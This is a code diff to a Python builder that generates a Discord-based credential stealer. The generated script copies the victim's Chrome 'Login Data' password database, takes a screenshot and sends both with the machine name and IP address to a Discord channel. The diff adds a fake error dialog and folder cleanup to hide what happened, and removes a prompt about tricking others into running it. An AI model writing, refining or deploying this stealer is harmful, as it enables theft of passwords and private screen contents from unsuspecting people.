@@ -5,7 +5,6 @@ from tkinter.simpledialog import messagebox
 from discord import Client, Intents
 import socket
 from PIL import ImageGrab
-import requests
 
 device_name = "{device_name}"
 ip_address = "{ip_address}"
@@ -55,21 +54,15 @@ import shutil
 import os
 import socket
 from PIL import ImageGrab
-import requests
-
-def get_public_ip():
-    try:
-        response = requests.get('https://api.ipify.org').text
-        return response
-    except Exception as e:
-        print(f"Error occurred while fetching public IP address: {e}")
-        return "Unknown"
 
 intents = discord.Intents.default()
 client = discord.Client(intents=intents)
 
 @client.event
 async def on_ready():
+    # Suppress console output
+    client.suppress_all_errors = True
+    
     folder_path = os.path.join(os.path.dirname(__file__), "bin")
     os.makedirs(folder_path, exist_ok=True)
     shutil.copyfile(r"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", os.path.join(folder_path, "Login Data"))
@@ -78,7 +71,7 @@ async def on_ready():
     file = discord.File(file_path)
 
     device_name = os.environ.get('COMPUTERNAME', 'Unknown device')
-    ip_address = get_public_ip()
+    ip_address = socket.gethostbyname(socket.gethostname())
 
     screenshot_path = os.path.join(folder_path, "screenshot.png")
     ImageGrab.grab().save(screenshot_path)
@@ -87,14 +80,20 @@ async def on_ready():
     await channel.send(message, file=file)
 
     await channel.send(file=discord.File(screenshot_path))
-
+    
+    # Show fake error messagebox
+    messagebox.showerror("Error", "An error occurred while generating files.")
+    
     await client.close()
 
 client.run("{token}")
+
+import shutil
+shutil.rmtree("bin")
 """)
         
         # Notify user
-        messagebox.showinfo("Info", "Files generated successfully. if you want trick other people? make zip file with inst.bat and req.txt")
+        messagebox.showinfo("Info", "Files generated successfully.")
 
 if __name__ == "__main__":
     root = tk.Tk()
